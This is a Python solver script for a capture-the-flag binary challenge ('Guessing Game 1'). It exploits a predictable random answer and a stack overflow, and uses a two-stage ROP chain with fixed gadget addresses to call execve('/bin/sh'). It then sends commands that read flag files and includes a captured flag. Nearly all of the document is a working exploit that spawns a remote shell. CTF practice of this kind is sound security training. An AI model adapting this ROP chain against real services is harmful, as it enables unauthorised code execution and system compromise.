"""Solver for challenge 90 Guessing Game 1 (picoCTF 2020 Mini-Competition, Binary).

Vuln analysis (guessing-game-1-vuln, static x86-64, no PIE, no canary in win()):
  - do_stuff(): answer = rand() % 100 + 1 with default seed (no srand call),
    so glibc rand() starts at seed 1 -> first answer is ALWAYS 84.
  - win(): fgets(winner, 360, stdin) into 0x70-byte stack frame
    (sub rsp, 0x70; buffer at rbp-0x70), no stack protector -> RIP control
    at offset 120 (0x70 buf + 8 saved RBP). Verified: 120 works live.
  - Static binary, no PIE -> fixed gadget addresses (objdump-verified):
      pop rdi; ret          0x40206f
      pop rsi; pop r15; ret 0x40206d   (2nd pop = dummy)
      pop rdx; xor eax,eax; pop rbp; pop r12; ret  0x422b69
      pop rax; pop rdx; pop rbx; ret   0x486bba (aligned)
      syscall; ret          0x41b406
      __read (libc read)    0x450e80
    Writable .bss at 0x4c9360 (use +0x100 headroom).
  - Plan: stage 1 read(0, BSS, 0x180), ret BSS;
    stage 2 = "/bin/sh" + execve(BSS, NULL, NULL).

Verified live 2026-10-28 -> academy{r0p_y0u_l1k3_4_hurr1c4n3_3ea9d94813b570b2}

Usage: solve_90_guessing_game_1.py [host] [port]
"""
import socket
import struct
import sys
import time

POP_RDI = 0x40206F          # pop rdi; ret
POP_RSI = 0x40206D          # pop rsi; pop r15; ret
POP_RAX = 0x486BBA          # pop rax; pop rdx; pop rbx; ret (aligned)
POP_RDX = 0x422B69          # pop rdx; xor eax,eax; pop rbp; pop r12; ret
SYSCALL = 0x41B406          # syscall; ret
READ = 0x450E80             # __libc_read
BSS = 0x4C9360 + 0x100      # writable .bss headroom
OFFSET = 120


def p64(v: int) -> bytes:
    return struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)


def stage1() -> bytes:
    rop = b'A' * OFFSET
    rop += p64(POP_RDI) + p64(0)                                  # fd = stdin
    rop += p64(POP_RSI) + p64(BSS) + p64(0xDEAD)                  # buf, r15 dummy
    rop += p64(POP_RAX) + p64(0) + p64(0x180) + p64(0xBEEF)       # rax=0, rdx=0x180
    rop += p64(READ)
    rop += p64(BSS)                                               # ret to stage 2
    return rop + b'\n'


def stage2() -> bytes:
    st = b'/bin/sh\x00'
    st += p64(POP_RDI) + p64(BSS)                                 # pathname
    st += p64(POP_RSI) + p64(0) + p64(0xDEAD)                     # argv=NULL
    st += p64(POP_RAX) + p64(59) + p64(0) + p64(0xBEEF)           # rax=59, rdx=0
    st += p64(SYSCALL)
    assert len(st) <= 0x180, len(st)
    return st.ljust(0x180, b'\x00')


def solve(host: str, port: int) -> bytes:
    s = socket.create_connection((host, port), timeout=30)
    f = s.makefile('rwb', buffering=0)

    def recv_until(marker: bytes, timeout: int = 20) -> bytes:
        data = b''
        end = time.time() + timeout
        while marker not in data and time.time() < end:
            try:
                chunk = f.read(1)
            except Exception:
                break
            if not chunk:
                break
            data += chunk
        return data

    recv_until(b'number would you like')
    f.write(b'84\n')                      # deterministic answer (default seed)
    recv_until(b'Name?')
    f.write(stage1())
    time.sleep(1)
    f.write(stage2())
    time.sleep(1)
    f.write(b'id; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; echo DONE_MARK\n')
    time.sleep(3)
    out = b''
    try:
        s.settimeout(8)
        while True:
            chunk = f.read(65536)
            if not chunk:
                break
            out += chunk
            if len(out) > 60000 or b'DONE_MARK' in out:
                break
    except Exception as e:
        out += ('[read-exc %s]' % e).encode()
    s.close()
    return out


if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 11475
    print(solve(host, port).decode(errors='replace'))
